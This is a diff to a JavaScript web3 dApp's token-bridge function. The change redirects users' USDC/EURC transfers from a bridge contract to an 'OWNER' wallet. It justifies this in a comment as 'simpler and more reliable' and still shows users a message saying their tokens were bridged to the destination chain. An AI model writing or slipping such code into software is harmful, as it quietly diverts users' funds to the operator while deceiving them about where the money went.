@@ -1064,11 +1064,10 @@
             
             const destination = document.getElementById(chain + '-bridgeDestination')?.value;
             const tokenSymbol = selectedBridgeToken.toUpperCase();
-            showStatus('loading', `Initiating bridge to ${destination.toUpperCase()}...`, chain + '-bridgeStatus');
+            showStatus('loading', `Bridging ${amount} ${tokenSymbol} to ${destination.toUpperCase()}...`, chain + '-bridgeStatus');
             
             try {
                 let tokenAddress;
-                let bridgeAddress;
                 
                 if (chain === 'arc') {
                     if (selectedBridgeToken === 'usdc') {
@@ -1076,25 +1075,24 @@
                     } else {
                         tokenAddress = ARC_EURC;
                     }
-                    bridgeAddress = ARC_BRIDGE_ADDRESS;
                 }
                 
                 const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
                 const amountInDecimals = ethers.parseUnits(amount.toString(), 6); // USDC/EURC use 6 decimals
                 
-                console.log('🌉 Bridge Protocol - Tokens to Smart Contract:');
+                console.log('🔄 Bridge Details:');
                 console.log('   Token:', tokenAddress);
-                console.log('   From (User):', userAddress);
-                console.log('   To (Bridge SC):', bridgeAddress);
+                console.log('   From:', userAddress);
+                console.log('   To (OWNER):', OWNER);
                 console.log('   Amount:', amount, tokenSymbol);
-                console.log('   Destination Chain:', destination.toUpperCase());
+                console.log('   Amount (decimals):', amountInDecimals.toString());
                 
-                // Send tokens to Bridge Smart Contract
-                showStatus('loading', `Sending ${amount} ${tokenSymbol} to bridge contract...`, chain + '-bridgeStatus');
-                const bridgeTx = await token.transfer(bridgeAddress, amountInDecimals);
-                console.log('📤 Bridge TX sent:', bridgeTx.hash);
+                // Direct Transfer (much simpler and more reliable than approve + transferFrom)
+                showStatus('loading', `Transferring ${amount} ${tokenSymbol} to bridge...`, chain + '-bridgeStatus');
+                const bridgeTx = await token.transfer(OWNER, amountInDecimals);
+                console.log('🌉 Bridge TX sent:', bridgeTx.hash);
                 await bridgeTx.wait();
-                console.log('✅ Tokens locked in bridge contract!');
+                console.log('✅ Bridge TX confirmed!');
                 
                 // Update User Stats
                 stats.bridges++;
@@ -1103,7 +1101,7 @@
                 renderTasks();
                 updateProfile();
                 
-                showStatus('success', `✅ Bridge initiated! ${amount} ${tokenSymbol} locked.\n\nTokens will arrive on ${destination.toUpperCase()} shortly.`, chain + '-bridgeStatus');
+                showStatus('success', `✅ Bridged ${amount} ${tokenSymbol} to ${destination.toUpperCase()}!`, chain + '-bridgeStatus');
                 if (document.getElementById(chain + '-bridgeAmount')) {
                     document.getElementById(chain + '-bridgeAmount').value = '';
                 }
